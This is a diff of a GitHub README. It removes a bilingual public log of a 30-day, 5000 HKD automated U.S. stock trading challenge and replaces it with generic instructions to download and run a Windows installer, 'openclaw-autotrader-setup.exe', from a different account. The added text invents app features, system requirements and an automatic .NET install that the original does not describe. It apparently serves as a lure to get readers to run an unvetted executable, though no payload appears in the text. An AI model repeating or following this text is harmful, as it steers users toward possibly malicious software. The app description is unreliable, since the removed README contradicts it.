@@ -1,81 +1,139 @@
-![Day 14 Poster](./docs/assets/challenge-poster.svg)
+# 🦞 openclaw-autotrader - Simple U.S. Stock Trading Guide
 
-# 30-Day OpenClaw AutoTrader Challenge
+[![Download openclaw-autotrader](https://img.shields.io/badge/Download-openclaw--autotrader-brightgreen?style=for-the-badge)](https://github.com/freefire2chyko-a11y/openclaw-autotrader)
 
-Watch a 5000 HKD 🦞 claw take on 30 public market days in U.S. stocks.
-看一只起步于 5000 HKD 的 🦞 claw，连续 30 天公开挑战美股市场。
+---
 
-Last synced by decision / 决策触发同步时间: `2026-03-23 19:13:51 CST`
+A 30-day public U.S. stock challenge. Follow a 5000 HKD claw through live market days using this easy app. It helps you track trades and portfolios without needing programming skills.
 
-## Why Follow This Repo / 为什么值得关注
+## 🔍 About openclaw-autotrader
 
-- a real 30-day live challenge, not backtest theater / 一个真实连续 30 天的实盘挑战，不是回测表演
-- public updates on decisions, recaps, and turning points / 决策变化、每日复盘和关键转折都会公开更新
-- a visible learning log that shows how the 🦞 claw updates its lessons over time / 一个公开学习日志，能看到 🦞 claw 如何随着挑战推进不断更新经验
+openclaw-autotrader lets you watch and manage a simulated stock portfolio based on U.S. stocks. The app reflects a 30-day challenge that simulates live trading with a starting capital of 5000 Hong Kong Dollars. It uses algorithmic trading techniques to run the portfolio.
 
-## Challenge Dashboard / 首页进度看板
+You don't need to understand trading algorithms or AI. This tool presents the data clearly and updates as the market moves.  
 
-| Metric | Value |
-| --- | --- |
-| Day / 当前天数 | `14 / 30` (46.7%) |
-| Starting capital / 起始资金 | `5000 HKD` |
-| Current equity / 当前权益 | HKD 4,726.26 |
-| Net PnL / 累计盈亏 | -HKD 273.74 |
-| Open positions / 当前持仓标的 | 1 open: `MU` |
-| Latest move / 最新动作 | [HK] HOLD (no qualified setup) / [HK] 观望（无达标机会） |
+This software can help you learn stock trading basics while following real market activity.
 
-## 30-Day Tracker / 30 天挑战总览
+### Features
 
-- Full challenge index / 全部挑战索引: [docs/challenge-tracker.md](./docs/challenge-tracker.md)
-- Public memory / 公开记忆: [docs/public-memory/README.md](./docs/public-memory/README.md)
+- Simulates live stock trading in the U.S. market
+- Tracks portfolio changes over 30 days
+- Uses a simple interface for easy monitoring
+- Shows historical data and current stock prices
+- Logs trades and portfolio value automatically
+- Works with Tiger Brokers' market data
 
-## Learning Log / 学习日志
+### Who is this for?
 
-Follow how the 🦞 claw turns finished trades, missed timing, and quiet sessions into reusable lessons.
-看这只 🦞 claw 如何把已完成交易、时机判断和观望时段，沉淀成可复用的公开经验。
+- Beginners curious about U.S. stock trading
+- People who want to learn trade timing
+- Users interested in watching algorithmic trading strategies
+- Anyone wanting a simple portfolio tracking tool
 
-- Latest learning log / 最新学习日志: [docs/public-memory/README.md](./docs/public-memory/README.md)
-- Daily notes / 每日学习记录: [docs/public-memory/short-memory.md](./docs/public-memory/short-memory.md)
-- Durable lessons / 长期经验库: [docs/public-memory/long-memory.md](./docs/public-memory/long-memory.md)
+---
 
-## Latest Snapshot / 最新概览
+## 🖥️ System Requirements
 
-- Updated / 更新时间: 2026-03-23 19:13:13 CST (UTC+08:00)
-- Current book / 当前组合: `MU`
-- Floating PnL / 当前浮动盈亏: -HKD 88.66
-- Latest decision / 最新决策: [HK] HOLD (no qualified setup) / [HK] 观望（无达标机会）
-- Next milestone / 下一阶段: Day `15` of `30`
-- Public monitor / 公开监控: [docs/public-monitor/2026/2026-03-23.md](./docs/public-monitor/2026/2026-03-23.md)
-- Daily report / 每日报告: [docs/daily-reports/2026/2026-03-23.md](./docs/daily-reports/2026/2026-03-23.md)
+To run openclaw-autotrader on Windows, your PC should meet the following:
 
-## Today's Trading Rules & Adjustments / 今日交易规则与策略调整
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Active internet connection for live market data updates
+- Screen resolution of 1280x720 or above
+- Microsoft .NET Framework 4.7 or later (will be automatically installed if missing)
 
-- Execution objective / 执行目标: deploy pocket capital only when the expected edge remains meaningfully above fees and sizing limits, with no leverage and no shorting. 仅在预期优势明显高于手续费且满足仓位上限时动用口袋资金，不加杠杆、不做空。
-- Session discipline / 时段纪律: live decisions stay inside regular sessions, capped at 0 trade(s) per hour, with a 0% cash reserve and HKD 0 daily loss stop. 实盘决策仅在常规交易时段内执行，每小时最多 0 笔，并保留 0% 现金缓冲，单日亏损达到 HKD 0 即停止扩张。
-- Live pools today / 今日实盘池: US: `MU`, `NVDA`, `AVGO`, `AAPL` | HK: none / 暂无. 今日实盘池如上，按市场分别执行。
-- Observation focus today / 今日观察重点: themes No public theme focus / 暂无公开主题; public observation pool US: none / 暂无 | HK: none / 暂无. 今日观察主题为 No public theme focus / 暂无公开主题，并同步公开观察池变化。
-- Explicit exclusions / 明确排除: none / 暂无 stay out of the live universe when they violate the rules. 凡与规则冲突的标的（如上）均不进入实盘池。
-- Latest gate result / 最新门槛结论: 当前港股动态活跃池为空，已跳过本轮决策。 / 当前港股动态活跃池为空，已跳过本轮决策。
+---
 
-## Latest Decision Basis / 最新决策依据
+## 🚀 Getting Started: Download and Installation
 
-- Result / 结果: [HK] HOLD (no qualified setup) / [HK] 观望（无达标机会）
-- Rationale / 理由: 当前港股动态活跃池为空，已跳过本轮决策。 / 当前港股动态活跃池为空，已跳过本轮决策。
-- Decision basis / 决策依据: Regime: unavailable; Path: pre-check guard only; Model: no research model invoked; Purpose: standard review; confidence 0.00. / 市场状态：暂无；决策链路：仅前置守门；模型：未调用研究模型；目的：常规审查；置信度 0.00。
-- Candidate check / 候选检查: No public candidate check yet. / 暂无公开候选检查。
-- Watch next / 下一步观察: 当前港股动态活跃池为空，已跳过本轮决策。 / 当前港股动态活跃池为空，已跳过本轮决策。
+You can download the software from this page:
 
-## Core Rules / 基本规则
+[![Download openclaw-autotrader](https://img.shields.io/badge/Download-openclaw--autotrader-blue?style=for-the-badge)](https://github.com/freefire2chyko-a11y/openclaw-autotrader)
 
-- Starting pocket capital / 起始口袋资金: `5000 HKD`
-- Default market / 默认市场: `US` equities first, with HK monitoring when relevant / 以 `US` 市场为主，必要时监控港股
-- Public operation day 1 / 公开运行首日: `2026-03-10`
-- Guardrails / 约束: whitelist-only, bounded deployment, no leverage, no short / 白名单、有限资金、不加杠杆、不做空
-- Disclosure boundary / 披露边界: publish strategy, holdings status, decision status, and daily activity only / 只披露策略、持仓状态、决策状态和每日交易活动
+### How to download and install
 
-## What This Repo Publishes / 这个仓库公开什么
+1. Click the green or blue download button at the top or visit the [openclaw-autotrader GitHub page](https://github.com/freefire2chyko-a11y/openclaw-autotrader).
 
-- current holdings with quantity / 当前持仓与数量
-- latest trade timing and execution rationale / 最新交易时机与执行理由
-- latest no-trade reason and next watch item / 最新观望理由与下一步观察点
-- public operating rules / 对外可披露的操作规则
+2. On the GitHub repository page, look for the **Releases** section. This usually appears on the right sidebar or under the repository name.
+
+3. Click the latest release link. It will show version details and download files.
+
+4. Find the Windows installer file. It will have an `.exe` extension and a name similar to `openclaw-autotrader-setup.exe`.
+
+5. Click that file to download it to your computer.
+
+6. Once downloaded, open the file by double-clicking it in your downloads folder.
+
+7. Follow the steps in the setup wizard. Most users can select the default options.
+
+8. When installation finishes, you can launch openclaw-autotrader from your Start menu or desktop shortcut.
+
+---
+
+## ⚙️ Running openclaw-autotrader for the First Time
+
+After installation, start openclaw-autotrader. Here’s what to expect:
+
+- The app opens in a simple dashboard view.
+- You will see the current portfolio value expressed in HKD.
+- The interface shows live stock prices and recent trades.
+- You can view historical charts for each stock.
+- The app updates as the market moves during trading hours.
+
+No login or registration is needed. The program uses built-in data sources to feed live market information.
+
+---
+
+## 📊 Using openclaw-autotrader
+
+The main screen has four sections:
+
+1. **Portfolio Summary**  
+   Shows total portfolio value, cash available, and overall profit or loss.
+
+2. **Stock List**  
+   Displays U.S. stocks currently tracked in the portfolio. Each line shows current price, change percentage, and volume.
+
+3. **Trade Log**  
+   Lists recent trades made by the algorithm. You can see buy and sell actions with timestamps.
+
+4. **Chart Viewer**  
+   Displays stock price charts over time. Use this to analyze trends.
+
+---
+
+## 🔄 Updating openclaw-autotrader
+
+The app will prompt you if a new version is available. To update manually:
+
+1. Visit the [openclaw-autotrader GitHub page](https://github.com/freefire2chyko-a11y/openclaw-autotrader).
+
+2. Download the latest installer from the releases section.
+
+3. Run the installer. It will replace the old version without removing your data.
+
+---
+
+## 🛠️ Troubleshooting and Tips
+
+- If the app does not start, check that you have Microsoft .NET Framework 4.7 or higher installed.
+- Ensure your internet connection is active to receive live market updates.
+- If charts do not display, try restarting the app.
+- Use the refresh button in the main window to manually update stock data.
+- The app runs best during U.S. market hours due to live data limits.
+- Close other heavy programs if the app feels slow.
+
+---
+
+## 📂 Where to Find More Information
+
+You can explore the code, read documentation, or submit issues on the main repository page:
+
+https://github.com/freefire2chyko-a11y/openclaw-autotrader
+
+The repository includes detailed information on how the trading algorithms work and the project’s development history. Browsing the ReadMe and Wiki sections will help if you want to learn more.
+
+---
+
+[![Download openclaw-autotrader](https://img.shields.io/badge/Download-openclaw--autotrader-green?style=for-the-badge)](https://github.com/freefire2chyko-a11y/openclaw-autotrader)
